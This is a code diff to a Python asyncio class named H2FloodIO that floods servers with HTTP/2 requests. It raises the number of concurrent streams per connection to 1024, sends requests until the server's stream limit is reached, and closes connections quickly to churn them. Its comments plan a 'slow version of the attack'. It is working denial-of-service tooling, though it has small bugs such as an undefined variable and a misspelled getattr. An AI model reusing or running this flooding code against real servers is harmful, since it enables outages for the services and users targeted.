@@ -17,6 +17,7 @@ import collections.abc
 setattr(collections, 'MutableSet', collections.abc.MutableSet)
 setattr(collections, 'MutableMapping', collections.abc.MutableMapping)
 import h2.connection
+from h2.exceptions import NoAvailableStreamIDError, TooManyStreamsError
 
 
 FloodSpecGen = Generator[Tuple[int, Any], None, None]
@@ -73,7 +74,7 @@ H2Request = Tuple[H2Headers, Optional[bytes]]
 
 class H2FloodIO(asyncio.Protocol):
 
-    _max_num_streams = 128
+    _max_num_streams = 1024
     _close_delay = 10.0
     _abort_delay = 10.0
 
@@ -85,44 +86,55 @@ class H2FloodIO(asyncio.Protocol):
         on_close: asyncio.Future,
         connections,
         on_connect: Optional[asyncio.Future] = None,
-        rcv: bool = False
+        recv: bool = False
     ):
         self._loop = loop
-        # XXX: ideally we have to read this from settings frame but it's gonna be harder
-        self._num_streams = self._max_num_streams
         self._requests = requests
         self._on_connect = on_connect
         self._on_close = on_close
         self._connections = connections
-        self._rcv = rcv
+        self._recv = recv
+        self._conn = None
+        self._transport = None
         self._close_handle = None
         self._abort_handle = None
+        self._requests_sent = False
 
     def connection_made(self, transport) -> None:
         self._connections.add(hash(transport))
         if self._on_connect and not self._on_connect.done():
             self._on_connect.set_result(True)
-        self._conn = h2.connection.H2Connection()
         self._transport = transport
-        # XXX: do we have to read? this is required at least for settings sync
-        if not self._rcv:
-            self._transport.pause_reading()
+        self._conn = h2.connection.H2Connection()
         self._conn.initiate_connection()
-        for ind in range(self._num_streams):
-            stream_id = 1+ind*2
-            headers, body = random.choice(self._requests)
-            self._conn.send_headers(stream_id, headers, end_stream=body is None)
-            if body is not None:
-                self._conn.send_data(stream_id, data, end_stream=True)
-        # send everything
-        self._loop.call_soon(self._send)
+        self._send()
+        # XXX: timeout to wait for settings frame
    
     def _send(self):
         data = self._conn.data_to_send()
         if len(data) > 0:
             self._transport.write(data)
-        # completely random wait interval
-        self._close_handle = self._loop.call_later(self._close_delay, self._close)
+
+    def _send_requests(self):
+        for _ in range(self._max_num_streams):
+            try:
+                # at the end of the day, we rely on the first RemoteSettingsChanged
+                # being receieved with the first data read on the socket
+                stream_id = self._conn.get_next_available_stream_id()
+                # there's an option for us to generate body as large as FRAME_SIZE
+                # negotiated as a part of settings exchange
+                headers, body = random.choice(self._requests)
+                self._conn.send_headers(stream_id, headers, end_stream=False)
+                if body is not None:
+                    # slow version of the attack would hold by delaying as many
+                    # ContinuationFrame(s) as possible. requires validation
+                    self._conn.send_data(stream_id, data, end_stream=False)
+                self._conn.end_stream(stream_id)
+            except (NoAvailableStreamIDError, TooManyStreamsError):
+                break
+        self._send()
+        self._requests_sent = True
+        self._loop.call_soon(self._close)
 
     def _cleanup_handle(self, handle_name: str):
         handle = getatt(self, handle_name, None)
@@ -132,28 +144,29 @@ class H2FloodIO(asyncio.Protocol):
             handle.cancel()
         setattr(self, handle_name, None)
 
-    # XXX: do we need to be good citizens by sending RST?
     def _close(self):
-        self._cleanup_handle('_close_handle')
         self._conn.close_connection()
-        data = self._conn.data_to_send()
-        if data:
-            self._transport.write(data)
+        self._send()
+        self._transport.close()
         self._abort_handle = self._loop.call_later(self._abort_delay, self._abort)
 
     def _abort(self):
-        self._cleanup_close()
-        self._cleanup_handle('_close_handle')
-        self._cleanup_handle('_abort_handle')
+        if self._abort_handle is not None:
+            if not self._abort_handle.done():
+                self._abort_handle.cancel()
+            self._abort_handle = None
         if self._transport:
             self._connections.remove(hash(self._transport))
             self._transport.abort()
             self._transport = None
 
-    # XXX: do we have to read? this is required at least for settings sync
     def data_received(self, data):
         _events = self._conn.receive_data(data)
-        self._loop.call_soon(self._send)
+        if not self._recv:
+            self._transport.pause_reading()
+        self._send()
+        if not self._requests_sent:
+            self._loop.call_soon(self._send_requests)
 
     def connection_lost(self, exc) -> None:
         self._on_close.set_result(True)
